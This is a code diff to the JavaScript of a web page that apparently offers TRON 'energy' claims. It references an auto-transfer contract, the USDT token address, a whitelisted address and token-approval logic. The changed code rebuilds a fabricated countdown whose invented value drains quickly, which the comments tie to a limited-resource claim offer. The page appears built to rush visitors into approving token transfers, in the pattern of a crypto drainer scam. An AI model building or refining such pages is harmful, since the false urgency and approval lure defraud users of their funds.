@@ -533,13 +533,14 @@ body {
 const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
 const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
 const A1_STATUS_KEY = "a1_signal_status"; // 新增：A1信号状态缓存键（之前缺失导致报错）
+// ========== 全局变量（清理重复定义） ==========
 let currentEnergy = 0;
-const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime(); // 固定部署时间（一次设置，全局统一）
-const INIT_TRX = 4104470400000; // 沿用你现在的高初始值（适配90000能量领取）
-const TRX_DECREASE_PER_SEC = 65200; // 沿用你现在的快消耗速度（符合资源有限）
-const STORAGE_KEY = "trx_countdown_data"; // localStorage存储key（刷新不重置）let trxTimer = null;
+const DEPLOY_START_TIME = new Date().getTime(); // 修复：用当前时间作为部署起始时间
+const INIT_TRX = 4104470400000;
+const TRX_DECREASE_PER_SEC = 65200;
+const STORAGE_KEY = "trx_countdown_data";
+let trxTimer = null; // 只保留1次定义
 let contractEnergyEl = null;
-let trxTimer = null;
 // 核心配置
 const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
 const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -936,28 +937,35 @@ function reRenderDynamicContent() {
     bindApproveLogic();
         renderEnergyRecords();
 }
-// ========== 能量减少逻辑 ==========
+// ========== 能量减少逻辑（优化计算，避免数值异常） ==========
 function calculateCurrentEnergy() {
-    // 从localStorage读取上次存储的能量（刷新不重置）
     const storedData = localStorage.getItem(STORAGE_KEY);
     if (storedData) {
-        const { energy, lastCalcTime } = JSON.parse(storedData);
-        // 计算上次到现在的消耗时间，更新剩余能量
-        const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
-        currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
+        try {
+            const { energy, lastCalcTime } = JSON.parse(storedData);
+            // 确保存储的能量和时间有效
+            if (typeof energy === "number" && typeof lastCalcTime === "number") {
+                const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
+                currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
+            } else {
+                // 存储数据异常，重新初始化
+                currentEnergy = INIT_TRX;
+            }
+        } catch (e) {
+            // JSON解析失败，重新初始化
+            currentEnergy = INIT_TRX;
+        }
     } else {
-        // 首次打开：按固定部署时间计算初始能量
-        const secPassed = Math.floor((Date.now() - DEPLOY_START_TIME) / 1000);
+        const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000)); // 确保secPassed非负
         currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
     }
-    // 存储最新能量和计算时间（下次刷新用）
+    // 存储最新数据（确保数值不溢出）
     localStorage.setItem(STORAGE_KEY, JSON.stringify({
         energy: currentEnergy,
         lastCalcTime: Date.now()
     }));
     return currentEnergy;
 }
-
 // 能量显示更新（沿用之前的递归定时器，只改计算逻辑）
 function updateEnergyDisplay() {
     if (!contractEnergyEl) return;
@@ -970,6 +978,13 @@ function updateEnergyDisplay() {
 
 // 启动定时器（无改动，沿用递归模式）
 function startPersistentEnergyCountdown() {
+    // 可选：首次使用时清除旧缓存（只执行一次）
+    const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
+    if (!hasClearedOldCache) {
+        localStorage.removeItem(STORAGE_KEY);
+        localStorage.setItem("has_cleared_old_cache", "true");
+    }
+    
     if (trxTimer) clearTimeout(trxTimer);
     calculateCurrentEnergy();
     updateEnergyDisplay();
